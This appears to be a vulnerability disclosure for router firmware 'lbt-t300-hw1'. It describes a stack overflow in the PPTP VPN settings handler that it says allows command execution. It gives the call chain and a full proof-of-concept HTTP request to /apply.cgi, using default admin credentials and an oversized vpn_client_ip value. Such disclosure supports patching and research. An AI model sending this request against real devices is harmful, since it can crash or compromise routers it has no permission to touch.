# lbt-t300-hw1
The VPN_client variable is passed in from the Web, and is obtained via the nvram_get function in config_vpn_pptp, causing a stack overflow vulnerability that can lead to arbitrary command execution. 
main-->sysK_main——>vpn_breakdetect-->connect_vpn-->start_vpn_pptp
<img width="1393" height="685" alt="920fa84c-c6b7-4e44-b206-87859e2676b6" src="https://github.com/user-attachments/assets/61e37d0a-5862-4b7b-afa1-7e912ad40d85" />
<img width="834" height="626" alt="cf3b8fb1-a5ff-4783-a703-10555cefebc3" src="https://github.com/user-attachments/assets/536039df-75fc-4773-b6d7-4e0209836e45" />
<img width="950" height="644" alt="81869c36-cdbc-4e80-bdc8-41c220a7a4b0" src="https://github.com/user-attachments/assets/3f9506fe-71d5-49dc-988f-ca16557f5992" />
<img width="670" height="1158" alt="59ffe518-c6dd-4a9f-9404-b3bb6650f771" src="https://github.com/user-attachments/assets/3bd0c0fd-80bb-462d-9bb7-c71988128112" />
<img width="1005" height="929" alt="d93602a8-26d3-4ea8-ba70-404f25e1a64c" src="https://github.com/user-attachments/assets/9942a709-b93a-4d0d-9610-7c51147e4af2" />
# POC
```
POST /apply.cgi HTTP/1.1
Host: 192.168.10.1
Cache-Control: max-age=0
Authorization: Basic YWRtaW46YWRtaW4=
Upgrade-Insecure-Requests: 1
Origin: http://192.168.10.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.10.1/VPN_PPTP.asp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

submit_button=VPN_PPTP&change_action=&vpn_pptp_auto=0&vpn_pptp_only=0&vpn_type=PPTP&vpn_pptp_enable=1&vpn_nat_enable=1&vpn_dns_enable=1&action=Apply&wb_pptp_enable=on&vpn_pptp_server=192.168.10.1&vpn_pptp_username=a&vpn_pptp_passwd=a&vpnc_auth=0&vpn_pptp_mppe=0&vpnc_stateful=0&vpn_pptp_mtu=1450&vpn_pptp_mru=1450&vpn_client_ip=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&vpn_pptp_redial_count=10&vpn_dst_enable=0&vpn_check_mode=0&web_vpn_nat_enable=on&web_vpn_dns_enable=on
```
